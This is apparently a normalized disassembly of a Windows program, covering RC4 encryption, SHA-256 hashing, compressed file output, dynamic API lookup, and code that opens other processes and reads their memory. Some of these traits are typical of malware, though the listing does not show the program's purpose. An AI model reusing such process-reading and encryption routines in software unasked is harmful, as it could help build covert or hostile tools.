push ecx
lea edx [ esp + 0x70 ]
push edx
call sub_4020f0
mov eax [ esp + 0x18 ]
push 0x10
push eax
lea ecx [ esp + 0x7c ]
push ecx
call sub_406210
mov ecx [ esp + 0x1090 ]
add esp 0x14
pop ebx
pop edi
pop esi
xor ecx esp
mov al 0x1
call sub_40acd2
add esp 0x1074
retn
push ebp
mov ebp [ ReadFile@IAT ]
lea ebx [ ebx ]
pop ebp
mov eax [ esp + 0x10 ]
push eax
lea edx [ esp + 0x84 ]
add edi eax
push edx
lea eax [ esp + 0x20 ]
push eax
call sub_401fd0
add esp 0xc
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp edi ebx
jb r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x1000
lea ecx [ esp + 0x8c ]
push ecx
push esi
call ebp
test eax eax
je r-xdata
sub_4022a0
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
cmp ecx eax
je r-xdata
xor al al
retn
push esi
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
pop esi
mov dl [ ecx ]
mov [ eax ] dl
add eax 0x1
add ecx 0x1
sub esi 0x1
jne r-xdata
sub_4022f0
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov al 0x1
je r-xdata
pop edi
retn
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
mov dl [ ecx ]
cmp dl [ esi ]
sete dl
and al dl
add ecx 0x1
add esi 0x1
sub edi 0x1
jne r-xdata
pop esi
sub_402350
push ecx
push ebx
push ebp
push esi
xor edx edx
push edi
xor eax eax
mov esi ecx
jmp r-xdata
mov [ esi ] al
add eax 0x1
add esi 0x1
cmp ax 0x100
jl r-xdata
mov [ ecx + 0x100 ] dl
mov [ ecx + 0x101 ] dl
xor esi esi
mov edi ecx
mov [ esp + 0x10 ] 0x100
movzx esi al
mov [ ecx + 0x102 ] bl
movzx eax [ esi + ecx ]
mov [ edi ] al
movzx eax [ ecx + 0x102 ]
mov [ esi + ecx ] al
lea eax [ edx + 0x1 ]
cdq
idiv [ esp + 0x1c ]
add edi 0x1
sub [ esp + 0x10 ] 0x1
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ esp + 0x18 ]
mov bl [ edi ]
movzx edx dl
movzx eax [ edx + eax ]
movzx ebp bl
add eax esi
add eax ebp
and eax 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
sub_4023e0
mov al [ ecx + 0x100 ]
mov dl [ ecx + 0x101 ]
sub esp 0xc
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
xor edi edi
movzx eax al
movzx esi dl
jmp r-xdata
lea edx [ eax + 0x1 ]
and edx 0x800000ff
jns r-xdata
movzx eax dl
mov bl [ eax + ecx ]
mov [ esp + 0x13 ] bl
movzx ebx bl
add ebx esi
and ebx 0x800000ff
jns r-xdata
dec edx
or edx 0xffffff00
inc edx
mov [ esp + 0x20 ] bl
movzx esi [ esp + 0x20 ]
movzx ebx [ esp + 0x13 ]
mov [ ecx + 0x102 ] bl
movzx ebx [ esi + ecx ]
mov [ eax + ecx ] bl
mov bl [ ecx + 0x102 ]
mov [ esi + ecx ] bl
mov [ esp + 0x14 ] esi
movsx esi di
add esi ebp
mov [ esp + 0x18 ] esi
movzx esi [ eax + ecx ]
movzx ebx bl
add ebx esi
and ebx 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
movzx esi bl
movzx ebx [ esi + ecx ]
mov esi [ esp + 0x18 ]
xor [ esi ] bl
je r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
pop edi
pop esi
mov [ ecx + 0x100 ] dl
mov dl [ esp + 0x18 ]
pop ebp
mov [ ecx + 0x101 ] dl
pop ebx
add esp 0xc
retn 0x4
add edi 0x1
cmp di 0x400
jl r-xdata
mov esi [ esp + 0x14 ]
mov al [ esp + 0x20 ]
pop edi
pop esi
pop ebp
mov [ ecx + 0x100 ] dl
mov [ ecx + 0x101 ] al
pop ebx
add esp 0xc
retn 0x4
sub_4024f0
push esi
push rw-data
mov esi ecx
call [ LoadLibraryA@IAT ]
test eax eax
mov [ esi + 0x11 ] eax
je r-xdata
mov al [ esi + 0x10 ]
pop esi
retn
push edi
mov edi [ GetProcAddress@IAT ]
push rw-data
push eax
mov [ esi + 0x10 ] 0x1
call edi
xor ecx ecx
test eax eax
setne cl
test cl cl
mov [ esi ] eax
mov [ esi + 0x10 ] cl
je r-xdata
xor eax eax
mov eax [ esi + 0x11 ]
push rw-data
push eax
call edi
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
xor eax eax
mov ecx [ esi + 0x11 ]
push rw-data
push ecx
call edi
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
mov [ esi + 0x10 ] al
pop edi
mov edx [ esi + 0x11 ]
push rw-data
push edx
call edi
test eax eax
mov [ esi + 0xc ] eax
je r-xdata
mov eax 0x1
jmp r-xdata
test al al
mov [ esi + 0x10 ] al
je r-xdata
mov eax 0x1
pop edi
mov [ esi + 0x10 ] al
pop esi
retn
test al al
mov [ esi + 0x10 ] al
je r-xdata
sub_4025c0
mov eax 0x502c
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5028 ] eax
push ebp
mov ebp [ esp + 0x5034 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x7 ] 0x0
call sub_4024e0
lea ecx [ esp + 0x10 ]
call sub_4024f0
test al al
je r-xdata
xor al al
pop ebp
mov ecx [ esp + 0x5028 ]
xor ecx esp
call sub_40acd2
add esp 0x502c
retn
lea eax [ esp + 0x8 ]
push eax
push 0x1000
lea ecx [ esp + 0x34 ]
push ecx
call [ esp + 0x1c ]
test eax eax
jne r-xdata
mov edx [ esp + 0x8 ]
push ebx
shr edx 0x2
sub edx 0x1
push esi
push edi
mov [ esp + 0x14 ] edx
xor ebx ebx
lea ecx [ esp + 0x10 ]
call sub_4025a0
push esi
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ edi + 0x1 ]
xor edx edx
div [ esp + 0x14 ]
mov esi [ esp + edx * 4 + 0x38 ]
add ebx 0x1
cmp ebx 0x10
jl r-xdata
lea eax [ esp + 0x34 ]
push eax
push 0x4
lea ecx [ esp + 0x20 ]
push ecx
push esi
call [ esp + 0x30 ]
test eax eax
jne r-xdata
call sub_402c00
xor edx edx
div [ esp + 0x14 ]
mov edi edx
mov esi [ esp + edi * 4 + 0x38 ]
call [ GetCurrentProcessId@IAT ]
cmp esi eax
jne r-xdata
mov bl [ esp + 0x13 ]
jmp r-xdata
mov eax [ esp + 0x18 ]
push 0x1000
lea edx [ esp + 0x403c ]
push edx
push eax
push esi
call [ esp + 0x34 ]
mov al [ esp + 0x4038 ]
test al al
lea ecx [ esp + 0x4038 ]
je r-xdata
lea ecx [ esp + 0x1c ]
call sub_4025a0
mov ecx [ esp + 0x5038 ]
pop edi
pop esi
mov al bl
pop ebx
pop ebp
xor ecx esp
call sub_40acd2
add esp 0x502c
retn
mov [ ebp ] 0x0
mov bl 0x1
mov edx [ esp + 0x5044 ]
test edx edx
je r-xdata
add ecx 0x1
mov [ ebp ] al
mov al [ ecx ]
add ebp 0x1
sub edx 0x1
test al al
jne r-xdata
cmp al 0x2e
je r-xdata
sub_4027a0
push esi
mov esi ecx
call sub_402770
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x1
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov [ esi + 0x4 ] eax
cmp eax 0xffffffff
setne al
pop esi
retn 0x4
pop esi
retn 0x4
sub_4027e0
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
xor esi esi
cmp ebp esi
push edi
mov edi ecx
mov [ esp + 0x10 ] esi
jle r-xdata
mov ecx [ edi + 0x4 ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ebp
push ebx
push ecx
call [ WriteFile@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
lea esp [ esp ]
mov eax [ edi + 0x8 ]
mov ecx [ eax + 0x4 ]
movzx eax [ esi + ebx ]
mov edx [ ecx + edi + 0x8 ]
mov edx [ edx + 0x8 ]
lea ecx [ ecx + edi + 0x8 ]
push eax
call edx
mov [ esi + ebx ] al
add esi 0x1
cmp esi ebp
jl r-xdata
sub_402850
push esi
mov esi ecx
call sub_402770
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov [ esi + 0x4 ] eax
cmp eax 0xffffffff
setne al
pop esi
retn 0x4
pop esi
retn 0x4
sub_402890
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
push esi
mov edi ecx
mov ecx [ esp + 0x1c ]
mov edx [ edi + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
push ebx
push edx
mov [ esp + 0x20 ] esi
call [ ReadFile@IAT ]
mov eax [ esp + 0xc ]
cmp eax esi
jbe r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn 0x8
mov edi edi
mov eax [ edi + 0x8 ]
mov ecx [ eax + 0x4 ]
movzx eax [ esi + ebx ]
mov edx [ ecx + edi + 0x8 ]
mov edx [ edx + 0x8 ]
lea ecx [ ecx + edi + 0x8 ]
push eax
call edx
mov [ esi + ebx ] al
mov eax [ esp + 0xc ]
add esi 0x1
cmp esi eax
jb r-xdata
sub_4028f0
push esi
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0x0
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
push eax
call [ SetFilePointer@IAT ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + esi + 0x8 ]
lea ecx [ edx + esi + 0x8 ]
mov edx [ eax + 0x4 ]
call edx
test edi edi
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
pop edi
mov al 0x1
pop esi
retn 0x4
lea esp [ esp ]
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx + esi + 0x8 ]
mov eax [ edx + 0x8 ]
lea ecx [ ecx + esi + 0x8 ]
push 0x0
call eax
sub edi 0x1
jne r-xdata
sub_402960
push esi
push edi
mov edi [ esp + 0xc ]
push 0x1
push 0x0
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
push eax
call [ SetFilePointer@IAT ]
test eax eax
jge r-xdata
test edi edi
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + esi + 0x8 ]
lea ecx [ edx + esi + 0x8 ]
mov edx [ eax + 0x8 ]
push 0x0
call edx
sub edi 0x1
jne r-xdata
sub_4029c0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_4027a0
test al al
jne r-xdata
push edi
lea edi [ esi + 0x34 ]
push 0x30
push edi
call sub_4022d0
add esp 0x8
call [ GetProcessHeap@IAT ]
push 0x1e
push 0x0
push 0x9
push edi
mov [ esi + 0x60 ] eax
mov [ esi + 0x58 ] sub_402730
mov [ esi + 0x5c ] sub_402750
call sub_410980
test eax eax
pop edi
setge al
pop esi
retn 0x4
pop esi
retn 0x4
sub_402a20
mov eax 0x8004
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8000 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x34 ]
nop
push edi
call sub_411230
mov ecx esi
call sub_4029b0
mov ecx [ esp + 0x8008 ]
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x8004
retn
mov eax [ esi + 0x44 ]
lea ecx [ esp + 0x8 ]
sub eax ecx
je r-xdata
mov edx ecx
push eax
push edx
mov ecx esi
call sub_4027e0
test eax eax
jne r-xdata
push 0x2
lea eax [ esp + 0xc ]
push edi
mov [ edi ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] 0x8000
call sub_410bf0
test eax eax
jl r-xdata
pop edi
xor al al
pop esi
mov ecx [ esp + 0x8000 ]
xor ecx esp
call sub_40acd2
add esp 0x8004
retn
sub_402ac0
mov eax 0x8004
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8000 ] eax
mov eax [ esp + 0x800c ]
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0x8010 ]
push edi
xor ebx ebx
test eax eax
lea edi [ esi + 0x34 ]
lea edx [ esp + 0xc ]
mov [ esi + 0x38 ] eax
mov [ edi ] ecx
mov [ esi + 0x44 ] edx
mov [ esi + 0x48 ] 0x8000
je r-xdata
mov eax ebx
push 0x0
lea eax [ esp + 0x10 ]
push edi
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] 0x8000
call sub_410bf0
test eax eax
jl r-xdata
mov eax [ esi + 0x44 ]
lea ecx [ esp + 0xc ]
sub eax ecx
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov edx ecx
push eax
push edx
mov ecx esi
call sub_4027e0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add ebx eax
mov ecx [ esp + 0x800c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x8004
retn 0x8
sub_402ba0
push esi
push edi
push ecx
push ebx
push edx
xor ebx ebx
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
mov bx [ esp + 0x20 ]
xor edx edx
xor eax eax
mov ax [ esi + 0x6 ]
div ebx
mov [ edi + 0x6 ] ax
mov eax edx
shl eax 0x10
mov ax [ esi + 0x4 ]
xor edx edx
div ebx
mov [ edi + 0x4 ] ax
mov eax edx
shl eax 0x10
mov ax [ esi + 0x2 ]
xor edx edx
div ebx
mov [ edi + 0x2 ] ax
mov eax edx
shl eax 0x10
mov ax [ esi ]
xor edx edx
div ebx
mov [ edi ] ax
mov eax edx
pop edx
pop ebx
pop ecx
pop edi
pop esi
retn
sub_402c00
mov eax 0x8030
call sub_40ad70
call [ GetTickCount@IAT ]
mov [ esp + 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
mov [ esp ] eax
lea eax [ esp + 0x8 ]
push eax
call [ QueryPerformanceCounter@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call [ GlobalMemoryStatus@IAT ]
push 0x8
lea edx [ esp + 0xc ]
push edx
push rw-data
call sub_4056e0
push 0x4
lea eax [ esp + 0x10 ]
push eax
push rw-data
call sub_4056e0
push 0x4
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
call sub_4056e0
push 0x20
lea edx [ esp + 0x38 ]
push edx
push rw-data
call sub_4056e0
push 0x4
push rw-data
push rw-data
call sub_4056e0
push 0x20
push rw-data
push rw-data
call sub_4056e0
add esp 0x48
push 0x8000
lea eax [ esp + 0x34 ]
push eax
push rw-data
call sub_4056e0
push rw-data
push rw-data
call sub_405780
mov eax [ rw-data ]
add eax 0x1
mov [ rw-data ] eax
and eax 0x7
mov eax [ eax * 4 + rw-data ]
add esp 0x8044
retn
sub_402d30
sub esp 0x124
mov eax [ esp + 0x12c ]
xor ecx ecx
mov ch [ eax ]
movzx edx [ eax + 0x2 ]
push ebx
push ebp
push esi
mov cl [ eax + 0x1 ]
push edi
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x3 ]
or ecx edx
mov [ esp + 0x34 ] ecx
xor ecx ecx
mov ch [ eax + 0x4 ]
movzx edx [ eax + 0x6 ]
mov cl [ eax + 0x5 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x7 ]
or ecx edx
mov [ esp + 0x38 ] ecx
xor ecx ecx
mov ch [ eax + 0x8 ]
movzx edx [ eax + 0xa ]
mov cl [ eax + 0x9 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0xb ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x3c ] ecx
xor ecx ecx
mov ch [ eax + 0xc ]
movzx edx [ eax + 0xe ]
mov cl [ eax + 0xd ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0xf ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x40 ] ecx
xor ecx ecx
mov ch [ eax + 0x10 ]
movzx edx [ eax + 0x12 ]
mov cl [ eax + 0x11 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x13 ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x44 ] ecx
xor ecx ecx
mov ch [ eax + 0x14 ]
movzx edx [ eax + 0x16 ]
mov cl [ eax + 0x15 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x17 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1a ]
mov [ esp + 0x48 ] ecx
xor ecx ecx
mov ch [ eax + 0x18 ]
mov cl [ eax + 0x19 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1b ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1e ]
mov [ esp + 0x4c ] ecx
xor ecx ecx
mov ch [ eax + 0x1c ]
mov cl [ eax + 0x1d ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x1f ]
or ecx edx
mov [ esp + 0x50 ] ecx
xor ecx ecx
mov ch [ eax + 0x20 ]
movzx edx [ eax + 0x22 ]
mov cl [ eax + 0x21 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x23 ]
or ecx edx
mov [ esp + 0x54 ] ecx
xor ecx ecx
mov ch [ eax + 0x24 ]
movzx edx [ eax + 0x26 ]
mov cl [ eax + 0x25 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x27 ]
or ecx edx
mov [ esp + 0x58 ] ecx
xor ecx ecx
mov ch [ eax + 0x28 ]
movzx edx [ eax + 0x2a ]
mov cl [ eax + 0x29 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x2b ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x5c ] ecx
xor ecx ecx
mov ch [ eax + 0x2c ]
movzx edx [ eax + 0x2e ]
mov cl [ eax + 0x2d ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x2f ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x60 ] ecx
xor ecx ecx
mov ch [ eax + 0x30 ]
movzx edx [ eax + 0x32 ]
mov cl [ eax + 0x31 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x33 ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x64 ] ecx
xor ecx ecx
mov ch [ eax + 0x34 ]
movzx edx [ eax + 0x36 ]
mov cl [ eax + 0x35 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x37 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3a ]
mov [ esp + 0x68 ] ecx
xor ecx ecx
mov ch [ eax + 0x38 ]
mov cl [ eax + 0x39 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3b ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3e ]
mov [ esp + 0x6c ] ecx
xor ecx ecx
mov ch [ eax + 0x3c ]
mov cl [ eax + 0x3d ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx eax [ eax + 0x3f ]
or ecx eax
mov eax [ esp + 0x138 ]
mov edx [ eax + 0x18 ]
mov edi [ eax + 0x8 ]
mov esi [ eax + 0xc ]
mov [ esp + 0x70 ] ecx
mov ecx [ eax + 0x10 ]
mov [ esp + 0x14 ] ecx
mov ecx [ eax + 0x1c ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x20 ]
mov [ esp + 0x30 ] ecx
xor ecx [ esp + 0x1c ]
mov ebx edx
ror ebx 0xb
and ecx edx
xor ecx [ esp + 0x30 ]
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp edx
ror ebp 0x6
xor ebx ebp
add ebx [ eax + 0x24 ]
mov eax [ eax + 0x14 ]
add ecx ebx
mov ebx [ esp + 0x34 ]
lea ebx [ ecx + ebx + 0x428a2f98 ]
lea ecx [ eax + ebx ]
mov [ esp + 0x10 ] ebx
mov ebx edi
ror ebx 0xd
mov eax edi
rol eax 0xa
xor ebx eax
mov eax edi
ror eax 0x2
xor ebx eax
add ebx [ esp + 0x10 ]
mov eax esi
or eax edi
and eax [ esp + 0x14 ]
mov ebp esi
and ebp edi
or eax ebp
add eax ebx
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
mov ebp ecx
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0x30 ]
mov ebp [ esp + 0x1c ]
xor ebp edx
and ebp ecx
xor ebp [ esp + 0x1c ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x38 ]
add ebp ebx
lea ecx [ ecx + ebp + 0x71374491 ]
add [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] ecx
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
mov ecx eax
or ecx edi
mov ebp eax
and ecx esi
and ebp edi
mov [ esp + 0x24 ] edx
or ecx ebp
add ebx [ esp + 0x10 ]
xor edx [ esp + 0x18 ]
add ecx ebx
and edx [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
xor edx [ esp + 0x24 ]
mov ebp ebx
ror ebp 0xb
rol ebx 0x7
xor ebp ebx
mov ebx [ esp + 0x14 ]
ror ebx 0x6
xor ebp ebx
add ebp [ esp + 0x1c ]
mov ebx [ esp + 0x3c ]
add edx ebp
lea edx [ edx + ebx - 0x4a3f0431 ]
add esi edx
mov [ esp + 0x10 ] edx
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx ecx
ror edx 0x2
xor ebx edx
add ebx [ esp + 0x10 ]
mov [ esp + 0x20 ] esi
mov edx eax
or edx ecx
and edx edi
mov ebp eax
and ebp ecx
or edx ebp
add edx ebx
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
ror esi 0x6
xor ebx esi
add ebx [ esp + 0x24 ]
mov esi [ esp + 0x18 ]
xor esi [ esp + 0x14 ]
mov ebp ecx
and esi [ esp + 0x20 ]
and ebp edx
xor esi [ esp + 0x18 ]
add esi ebx
mov ebx [ esp + 0x40 ]
lea esi [ esi + ebx - 0x164a245b ]
add edi esi
mov [ esp + 0x10 ] esi
mov ebx edx
ror ebx 0xd
mov esi edx
rol esi 0xa
xor ebx esi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi ecx
or esi edx
and esi eax
or esi ebp
add esi ebx
mov ebx edi
mov ebp edi
ror ebx 0xb
mov [ esp + 0x2c ] edi
rol ebp 0x7
xor ebx ebp
ror edi 0x6
xor ebx edi
mov edi [ esp + 0x14 ]
xor edi [ esp + 0x20 ]
and edi [ esp + 0x2c ]
xor edi [ esp + 0x14 ]
add ebx [ esp + 0x18 ]
mov ebp edx
add edi ebx
mov ebx [ esp + 0x44 ]
lea edi [ edi + ebx + 0x3956c25b ]
add eax edi
mov [ esp + 0x10 ] edi
and ebp esi
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
add ebx [ esp + 0x10 ]
mov edi edx
or edi esi
and edi ecx
or edi ebp
add edi ebx
mov [ esp + 0x18 ] edi
mov edi eax
ror edi 0xb
mov ebx eax
rol ebx 0x7
xor edi ebx
mov ebx eax
ror ebx 0x6
xor edi ebx
add edi [ esp + 0x14 ]
mov ebx [ esp + 0x20 ]
xor ebx [ esp + 0x2c ]
and ebx eax
xor ebx [ esp + 0x20 ]
add ebx edi
mov edi [ esp + 0x48 ]
lea edi [ ebx + edi + 0x59f111f1 ]
add ecx edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x18 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx esi
or ebx edi
and ebx edx
mov [ esp + 0x1c ] ebx
mov ebx esi
and ebx edi
mov edi [ esp + 0x1c ]
or edi ebx
add edi ebp
mov [ esp + 0x14 ] edi
mov ebx ecx
ror ebx 0xb
mov edi ecx
rol edi 0x7
xor ebx edi
mov edi ecx
ror edi 0x6
xor ebx edi
mov edi [ esp + 0x2c ]
add ebx [ esp + 0x20 ]
mov ebp eax
xor ebp edi
and ebp ecx
xor ebp edi
mov edi [ esp + 0x4c ]
add ebp ebx
lea edi [ edi + ebp - 0x6dc07d5c ]
mov [ esp + 0x10 ] edi
add edx edi
mov edi [ esp + 0x14 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x18 ]
or ebx edi
and ebx esi
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
and ebx edi
mov edi [ esp + 0x1c ]
or edi ebx
add edi ebp
mov [ esp + 0x20 ] edi
mov edi edx
ror edi 0xb
mov ebx edx
rol ebx 0x7
xor edi ebx
mov ebx edx
ror ebx 0x6
xor edi ebx
add edi [ esp + 0x2c ]
mov ebx eax
xor ebx ecx
and ebx edx
xor ebx eax
add ebx edi
mov edi [ esp + 0x50 ]
lea edi [ ebx + edi - 0x54e3a12b ]
add esi edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x20 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
or ebx edi
and ebx [ esp + 0x18 ]
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x14 ]
and ebx edi
mov edi [ esp + 0x1c ]
or edi ebx
add edi ebp
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
mov ebp esi
ror ebp 0x6
xor ebx ebp
add ebx eax
mov eax [ esp + 0x54 ]
mov ebp ecx
xor ebp edx
and ebp esi
xor ebp ecx
add ebp ebx
lea eax [ eax + ebp - 0x27f85568 ]
add [ esp + 0x18 ] eax
mov [ esp + 0x10 ] eax
mov ebp edi
ror ebp 0xd
mov eax edi
rol eax 0xa
xor ebp eax
mov [ esp + 0x2c ] edi
mov eax edi
mov ebx [ esp + 0x20 ]
ror eax 0x2
xor ebp eax
add ebp [ esp + 0x10 ]
mov eax ebx
and ebx edi
or eax edi
and eax [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
or eax ebx
add eax ebp
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
mov ebp edi
ror ebp 0x6
xor ebx ebp
add ebx ecx
mov ecx [ esp + 0x58 ]
mov ebp edx
xor ebp esi
and ebp edi
xor ebp edx
add ebp ebx
mov edi [ esp + 0x2c ]
lea ecx [ ecx + ebp + 0x12835b01 ]
add [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] ecx
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
add ebx [ esp + 0x10 ]
mov ecx eax
or ecx edi
and ecx [ esp + 0x20 ]
mov ebp eax
and ebp edi
mov edi [ esp + 0x14 ]
or ecx ebp
add ecx ebx
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
ror edi 0x6
xor ebx edi
add ebx edx
mov edx [ esp + 0x5c ]
mov edi esi
xor edi [ esp + 0x18 ]
mov ebp eax
and edi [ esp + 0x14 ]
and ebp ecx
xor edi esi
add edi ebx
lea edx [ edi + edx + 0x243185be ]
mov edi [ esp + 0x20 ]
add edi edx
mov [ esp + 0x10 ] edx
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx ecx
ror edx 0x2
xor ebx edx
mov edx eax
or edx ecx
and edx [ esp + 0x2c ]
mov [ esp + 0x20 ] edi
or edx ebp
add ebx [ esp + 0x10 ]
add edx ebx
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
ror edi 0x6
xor ebx edi
mov edi [ esp + 0x18 ]
xor edi [ esp + 0x14 ]
add ebx esi
and edi [ esp + 0x20 ]
mov esi [ esp + 0x60 ]
xor edi [ esp + 0x18 ]
mov ebp ecx
add edi ebx
lea esi [ edi + esi + 0x550c7dc3 ]
mov edi [ esp + 0x2c ]
add edi esi
mov [ esp + 0x10 ] esi
mov ebx edx
ror ebx 0xd
mov esi edx
rol esi 0xa
xor ebx esi
and ebp edx
mov [ esp + 0x2c ] edi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi ecx
or esi edx
and esi eax
or esi ebp
add esi ebx
mov ebx edi
mov ebp edi
ror ebx 0xb
rol ebp 0x7
xor ebx ebp
ror edi 0x6
xor ebx edi
add ebx [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
xor edi [ esp + 0x20 ]
mov ebp edx
and edi [ esp + 0x2c ]
and ebp esi
xor edi [ esp + 0x14 ]
add edi ebx
mov ebx [ esp + 0x64 ]
lea edi [ edi + ebx + 0x72be5d74 ]
add eax edi
mov [ esp + 0x10 ] edi
mov ebx esi
ror ebx 0xd
mov edi esi
